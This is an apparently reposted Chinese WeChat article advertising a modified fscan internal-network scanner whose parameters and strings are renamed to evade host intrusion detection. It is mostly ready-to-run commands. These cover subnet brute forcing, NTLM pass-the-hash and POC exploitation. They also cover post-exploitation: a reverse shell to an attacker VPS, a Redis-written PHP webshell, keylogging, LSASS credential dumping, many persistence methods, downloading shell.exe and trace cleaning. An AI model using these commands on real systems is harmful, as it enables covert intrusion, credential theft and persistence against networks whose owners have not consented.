---
title: Fscan 魔改版 — 内网渗透扫描工具
url: https://mp.weixin.qq.com/s/L7LumEP46MUhrkv533c7OQ
source: Doonsec's feed
date: 2026-07-03
fetch_date: 2026-07-04T05:38:25.428624
---

# Fscan 魔改版 — 内网渗透扫描工具

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/TVljsu2eAicIyoKVk8R70LRNPlA6KXaZSFQibo6sQq15EpV67iaibiblicDJlwc4OHjzN1wZuQlOiaibiaLTDbCAUC2MfBqFlf3ibfo2UB613SCQhH5fE/0?wx_fmt=jpeg)

# Fscan 魔改版 — 内网渗透扫描工具

Hacking黑白红

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

### 工具介绍

Fscan 魔改版 — 内网渗透扫描工具。基于 fscan v2.1.3 修改，针对红队场景进行了参数混淆与特征规避。

## 快速开始

```
# 扫描一个 C 段（存活探测 + 端口扫描 + 服务识别 + 弱口令爆破 + POC）fscan.exe -t 192.168.1.0/24# 仅存活探测fscan.exe -t 192.168.1.0/24 -ao# 扫描单个主机fscan.exe -t 192.168.1.100# 扫描多个 IP 段fscan.exe -t 192.168.1.0/24,10.0.0.0/24# 从文件读取目标fscan.exe -tf targets.txt
```

## 魔改说明

本版本对原版 fscan 做了以下修改以规避 HIDS 特征检测：

| 修改项 | 说明 |
| --- | --- |
| **参数名混淆** | 所有命令行参数重命名（见下方映射表） |
| **Banner 静默** | 启动时不输出 fscan ASCII Logo 和版本信息 |
| **模块名更改** | Go 模块路径改为 `test`，去除 `fscan` 名字特征 |
| **源码字符串清理** | 代码中不出现 `fscan` 相关特征字符串 |

**原版 ↔ 魔改参数映射：**

| 原版 fscan | 魔改后 | 说明 |
| --- | --- | --- |
| `-h` | **`-t`** | 目标 IP / 网段 / 域名 |
| `-eh` | **`-et`** | 排除主机 |
| `-ehf` | **`-etf`** | 排除主机文件 |
| `-p` / `-p` | **`-tp`** | 端口 |
| `-ep` | **`-etp`** | 排除端口 |
| `-hf` （原主机文件） | **`-tf`** | 主机列表文件 |
| `-pf` （原端口文件） | **`-tpf`** | 端口列表文件 |
| `-userf` | **`-uf`** | 用户名字典文件（挤占原 `-uf` 位） |
| `-pwdf` | **`-pf`** | 密码字典文件 |
| `-uf` （原 URL 文件） | **`-urlf`** | URL 列表文件 |
| `-u` （原 URL） | **`-url`** | Web 目标 URL |
| `-user` | **`-usr`** | 用户名 |
| `-pwd` | **`-pw`** | 密码 |
| `-usera` | **`-ua`** | 额外用户名 |
| `-pwda` | **`-pa`** | 额外密码 |
| `-upf` | **`-up`** | 用户名:密码对文件 |
| `-hash` | **`-hv`** | 哈希值 |
| `-hashf` | **`-hf`** | 哈希文件 |
| `-domain` | **`-dm`** | 域名 |
| `-sshkey` | **`-sk`** | SSH 私钥 |
| `-m` | **`-st`** | 扫描模式 |
| `-t` （线程） | **`-tn`** | 端口扫描线程数 |
| `-time` | **`-tm`** | 超时时间(秒) |
| `-o` | **`-out`** | 输出文件 |
| `-f` | **`-fmt`** | 输出格式 |

**使用场景**

### 1. 内网扫描

```
# 全量扫描整个 C 段（最常用）fscan.exe -t 192.168.1.0/24# 仅存活探测（快速定位在线主机）fscan.exe -t 192.168.1.0/24 -ao# ICMP 模式存活探测fscan.exe -t 192.168.1.0/24 -st icmp# 扫描多个网段fscan.exe -t 192.168.1.0/24,10.10.0.0/16# 扫描 IP 范围fscan.exe -t 192.168.1.1-100# 排除特定主机fscan.exe -t 192.168.1.0/24 -et 192.168.1.1,192.168.1.254# 从文件读取目标列表fscan.exe -tf targets.txt
```

### 2. 端口与协议控制

```
# 扫描指定端口fscan.exe -t 192.168.1.0/24 -tp 22,80,443,3306,3389,6379# 扫描常用 Web 端口fscan.exe -t 192.168.1.0/24 -tp 80,81,443,8080,8443,9090# 扫描全部端口（慢，谨慎使用）fscan.exe -t 192.168.1.0/24 -tp 1-65535 -tn 1000# 排除特定端口fscan.exe -t 192.168.1.0/24 -etp 445,139# 跳过 Ping 探测（纯 TCP 扫描，适合禁 Ping 环境）fscan.exe -t 192.168.1.0/24 -np# 跳过 TCP 补充探测fscan.exe -t 192.168.1.0/24 -ntp# 调整扫描线程和超时（网络差时降低线程数）fscan.exe -t 192.168.1.0/24 -tn 200 -tm 5# 限制发包速率（规避流量检测）fscan.exe -t 192.168.1.0/24 -rate 1000
```

### 3. 弱口令爆破

```
# 全量扫描 + 自动爆破（默认开启）fscan.exe -t 192.168.1.0/24# 禁用爆破（只扫端口和服务识别）fscan.exe -t 192.168.1.0/24 -nobr# 指定自定义凭据fscan.exe -t 192.168.1.0/24 -usr admin -pw admin123# 使用字典文件fscan.exe -t 192.168.1.0/24 -uf users.txt -pf pass.txt# 使用用户名:密码对文件（每行 user:pass）fscan.exe -t 192.168.1.0/24 -up creds.txt# 添加额外用户/密码（与原字典合并）fscan.exe -t 192.168.1.0/24 -ua root,admin -pa 123456,password# 指定域名（用于域认证爆破）fscan.exe -t 192.168.1.0/24 -dm corp.local# SSH 私钥登录fscan.exe -t 192.168.1.100 -sk id_rsa# NTLM 哈希传递fscan.exe -t 192.168.1.100 -hv "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
```

### 4. Web 扫描

```
# 扫描单个 Web 站点fscan.exe -url http://192.168.1.100:8080# 扫描多个 URL（从文件读取）fscan.exe -urlf urls.txt# 带 Cookie 扫描fscan.exe -url http://192.168.1.100 -cookie "PHPSESSID=xxx"# 使用 HTTP 代理fscan.exe -url http://192.168.1.100 -proxy http://127.0.0.1:8080# 使用 SOCKS5 代理fscan.exe -t 192.168.1.0/24 -socks5 socks5://127.0.0.1:1080# 指定网卡（VPN 场景）fscan.exe -t 10.8.0.0/24 -iface 10.8.0.5
```

### 5. POC 漏洞检测

```
# 全量扫描 + POC 检测（默认开启）fscan.exe -t 192.168.1.0/24# 禁用 POC 扫描（加快速度）fscan.exe -t 192.168.1.0/24 -nopoc# 全量 POC 扫描（更全面但更慢）fscan.exe -t 192.168.1.0/24 -full# 指定 POC 名称fscan.exe -t 192.168.1.100 -pocname thinkphp# 自定义 POC 脚本目录fscan.exe -t 192.168.1.100 -pocpath ./custom-pocs/# 调整 POC 并发数fscan.exe -t 192.168.1.0/24 -num 10# 启用 DNSLogfscan.exe -t 192.168.1.0/24 -dns
```

### 6. 凭据复用与哈希传递

```
# NTLM 哈希传递（配合爆破模块使用）fscan.exe -t 192.168.1.100 -hv "31d6cfe0d16ae931b73c59d7e0c089c0"# 哈希文件批量传递fscan.exe -t 192.168.1.0/24 -hf hashes.txt# 复用域用户凭据fscan.exe -t 192.168.1.0/24 -usr administrator -pw P@ssw0rd -dm corp.local
```

### 7. 后渗透利用

```
# 查看所有可用本地插件fscan.exe -local list# 收集系统信息fscan.exe -local systeminfo# 反弹 Shell（先在外网 VPS 监听）fscan.exe -local reverseshell -rsh your-vps.com:4444# 启动正向 Shell（等待目标连接）fscan.exe -local forwardshell -fsh-port 4444# 启动 SOCKS5 代理（本地监听 1080）fscan.exe -local socks5proxy -start-socks5 1080# Redis 写公钥fscan.exe -t 192.168.1.100 -st redis -rs "ssh-rsa AAAAB3N..."# Redis 写 Webshellfscan.exe -t 192.168.1.100 -st redis -rwp /var/www/html -rwc "<?php system($_GET['cmd']);?>"# 键盘记录fscan.exe -local keylogger -keylog-output keylog.txt# LSASS 凭证提取fscan.exe -local minidump# Windows 持久化（启动项）fscan.exe -local winstartup -win-pe C:\shell.exe# 文件下载fscan.exe -local download -download-url http://example.com/shell.exe -download-path C:\Users\Public\shell.exe# 清理痕迹fscan.exe -local cleaner
```

### 8. 输出控制

```
# 指定输出文件fscan.exe -t 192.168.1.0/24 -out scan-result.txt# JSON 格式输出fscan.exe -t 192.168.1.0/24 -fmt json -out result.json# CSV 格式输出fscan.exe -t 192.168.1.0/24 -fmt csv -out result.csv# 不保存文件，仅屏幕输出fscan.exe -t 192.168.1.0/24 -no# 静默模式（减少输出量）fscan.exe -t 192.168.1.0/24 -silent# 调试模式（详细日志）fscan.exe -t 192.168.1.0/24 -debug# 输出性能统计fscan.exe -t 192.168.1.0/24 -perf
```

## 支持的爆破服务

| 服务 | 插件 | 默认端口 |
| --- | --- | --- |
| MySQL | mysql | 3306 |
| MSSQL | mssql | 1433 |
| Oracle | oracle | 1521 |
| PostgreSQL | postgresql | 5432 |
| Redis | redis | 6379 |
| MongoDB | mongodb | 27017 |
| Elasticsearch | elasticsearch | 9200 |
| SSH | ssh | 22 |
| FTP | ftp | 21 |
| Telnet | telnet | 23 |
| SMB | smb | 445 |
| RDP | rdp | 3389 |
| VNC | vnc | 5900 |
| LDAP | ldap | 389 |
| SMTP | smtp | 25 |
| POP3 | pop3 | 110 |
| IMAP | imap | 143 |
| SNMP | snmp | 161(UDP) |
| DNS | dns | 53 |
| Rsync | rsync | 873 |
| Memcached | memcached | 11211 |
| RabbitMQ | rabbitmq | 5672 |
| ActiveMQ | activemq | 61616 |
| Kafka | kafka | 9092 |
| Zookeeper | zookeeper | 2181 |
| Neo4j | neo4j | 7687 |
| Cassandra | cassandra | 9042 |
| MQTT | mqtt | 1883 |
| Modbus | modbus | 502 |
| BACnet | bacnet | 47808 |
| IPMI | ipmi | 623 |
| NetBIOS | netbios | 137-139 |
| NFS | nfs | 2049 |
| RMI | rmi | 1099 |
| JDWP | jdwp | 5005 |

后渗透插件列表

通过 `-local` 参数调用：

| 插件名 | 功能 | 平台 |
| --- | --- | --- |
| `systeminfo` | 系统信息收集 | 全平台 |
| `reverseshell` | 反弹 Shell | 全平台 |
| `forwardshell` | 正向 Shell | Windows |
| `socks5proxy` | 启动 SOCKS5 代理 | 全平台 |
| `keylogger` | 键盘记录 | Windows |
| `minidump` | LSASS 凭据提取 | Windows |
| `sshkey` | SSH 公钥注入 | Linux |
| `cleaner` | 痕迹清理 | 全平台 |
| `crontask` | Cron 持久化 | Linux |
| `systemdservice` | Systemd 服务持久化 | Linux |
| `ldpreload` | LD\_PRELOAD Rootkit | Linux |
| `winregistry` | 注册表持久化 | Windows |
| `winschtask` | 计划任务持久化 | Windows |
| `winservice` | 服务持久化 | Windows |
| `winstartup` | 启动项持久化 | Windows |
| `winlogon` | 登录脚本持久化 | Windows |
| `winwmi` | WMI 持久化 | Windows |
| `winbits` | BITS 任务持久化 | Windows |
| `winifeo` | IFEO 持久化 | Windows |
| `avdetect` | 杀软检测 | Windows |
| `download` | 文件下载 | 全平台 |

```
# 列出所有本地插件fscan.exe -local list
# 使用特定插件fscan.exe -local systeminfo
```

## WebUI 模式

本工具内置了 Web 管理界面（需使用 web 版本编译）。

```
# 启动 Web 服务fscan-web.exe
# 启动后访问 http://127.0.0.1:8080
```

WebUI 功能：

* 图形化扫描任务管理
* 实时 WebSocket 结果推送
* 扫描预设保存
* 资产项目管理
* 多语言支持（中文/English）
* 深色模式

### 项目地址

```
https://github.com/webzzaa/pscan/
```

预览时标签不可点

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTk9JHJcRia5QdqxUfpBz4cb5VGKUIUyrVaviawse20DccoB4C6WKwxm6xVzq4oU7dSdfxryTMc9Vvg/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过